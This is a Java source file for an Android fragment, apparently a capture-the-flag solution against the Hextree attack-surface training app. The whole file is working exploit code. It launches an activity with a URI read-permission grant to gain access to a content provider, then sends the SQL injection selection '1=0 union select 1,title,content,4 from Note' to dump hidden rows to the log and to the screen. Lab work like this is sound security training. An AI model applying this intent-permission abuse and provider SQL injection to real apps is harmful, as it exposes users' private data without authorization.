package com.appdev.intentattacks;

import android.content.ComponentName;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

public class Flag33_2Fragment extends Fragment {
    private static final String TAG = "Flag33_2Fragment";

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_flag33_2, container, false);
        Button launchButton = view.findViewById(R.id.btnLaunchFlag33_2);
        
        launchButton.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag8Activity"));
            intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            intent.setAction("io.hextree.FLAG33");
            Uri uri = Uri.parse("content://io.hextree.flag33_2/flags");
            intent.setData(uri);
            startActivityForResult(intent, 1337);
        });

        return view;
    }
    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent intent) {
        super.onActivityResult(requestCode, resultCode, intent);
        Utils.showDialog(getContext(), intent);
        dumpFlag34Provider();
    }

    private void dumpFlag34Provider() {
        Uri uri = Uri.parse("content://io.hextree.flag33_2/flags");
        String selection = "1=0 union select 1,title,content,4 from Note";
        Cursor cursor = requireContext().getContentResolver().query(uri, null, selection,
                null, null);

        if (cursor != null) {
            if (cursor.moveToFirst()) {
                do {
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < cursor.getColumnCount(); i++) {
                        if (sb.length() > 0) sb.append(", ");
                        sb.append(cursor.getColumnName(i)).append(" = ").append(cursor.getString(i));
                    }
                    Log.d(TAG, sb.toString());
                    Toast.makeText(getContext(), sb.toString(), Toast.LENGTH_LONG).show();
                } while (cursor.moveToNext());
            } else {
                Log.d(TAG, "Cursor is empty.");
                Toast.makeText(getContext(), "No data found", Toast.LENGTH_SHORT).show();
            }
            cursor.close();
        } else {
            Log.d(TAG, "Query failed or returned null cursor.");
            Toast.makeText(getContext(), "Query failed", Toast.LENGTH_SHORT).show();
        }
    }
} 